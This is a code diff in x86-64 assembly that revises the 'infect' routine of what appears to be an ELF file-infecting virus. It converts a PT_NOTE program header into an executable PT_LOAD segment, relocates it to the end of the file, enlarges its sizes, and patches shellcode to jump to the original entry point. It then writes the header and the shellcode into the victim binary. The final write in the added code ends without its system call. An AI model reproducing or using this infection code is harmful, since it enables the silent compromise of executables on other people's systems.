@@ -200,45 +200,54 @@ next_ph:
     jmp close
 
 infect:
-    ; Change PT_NOTE to PT_LOAD
-    mov eax, [rsi]
-    and eax, 0xFFFF0000 ; Clear the last 16 bits
-    or eax, 1
+    ; Change PT_NOTE segment to PT_LOAD
+    xor eax, eax        ; Clear eax
+    or eax, 1           ; Set the last 16 bits to 1 (PT_LOAD)
     mov [rsi], eax
 
-    ; Allow executable instructions
-    mov eax, [rsi + 12] ; Get p_flags
-    or eax, 0x1         ; Set the executable flag
-    mov [rsi + 12], eax
+    ; Give read and execute permissions to the segment
+    xor eax, eax        ; Clear eax
+    or eax, 5           ; r/x permissions
+    mov [rsi + 4], eax
 
-    ; Set an address that's far enough to avoid overlapping during exec
-    mov eax, 0xc000000
-    mov [rsi + 16], eax ; Set p_vaddr
+    ; Change the offset to the end
+    xor rax, rax        ; p_offset is twice as big so we'll use rax
+    or rax, [file_size]
+    mov [rsi + 8], rax
 
-    ; Set size of injected code
-    mov eax, shellcode_len
-    mov [rsi + 20], eax    ; Set p_filesz
-    mov [rsi + 24], eax    ; Set p_memsz
+    ; Change the entry point to somewhere very far
+    xor rax, rax
+    or rax, 0xc000000
+    add rax, [file_size]
+    mov [rsi + 16], rax
 
-    ; Point offset to injected code
-    mov rax, [stat + 48]    ; st_size
-    mov [rsi + 8], rax      ; Set p_offset
+    ; Add shellcode_len to filesz and memsz
+    mov rax, [rsi + 32] ; Get the p_filesz field
+    add rax, shellcode_len
+    mov [rsi + 32], rax
 
-    ; Write the shellcode to the end of the file
-    mov rax, 18            ; pwrite
-    mov rdi, [fd]          
-    lea rsi, [shellcode]   
+    mov rax, [rsi + 40] ; Get the p_memsz field
+    add rax, shellcode_len
+    mov [rsi + 40], rax
+
+    ; Update shellcode to jump to the original entry point
+    mov rax, [old_e_entry]
+    mov [shellcode + 23], rax
+
+    ; Write the changes to the file
+    mov rax, 18      ; pwrite64
+    mov rdi, [fd]   
+    mov rsi, buffer
+    mov rdx, [file_size]
+    xor r10, r10    ; No offset
+    syscall
+
+    ; Write the shellcode at the end of the file
+    mov rax, 18      ; pwrite64
+    mov rdi, [fd]
+    mov rsi, shellcode
     mov rdx, shellcode_len
-    mov r10, rax           ; offset (file size)
-    syscall
-
-    ; Write the modified program header back to the file
-    mov rax, 18            
-    mov rdi, [fd]         
-    lea rsi, [modified_header]
-    mov rdx, buffer_len
-    mov r10, 0             ; offset (start of the file)
-    syscall
+    mov r10, [file_size]
 
     jmp close
 
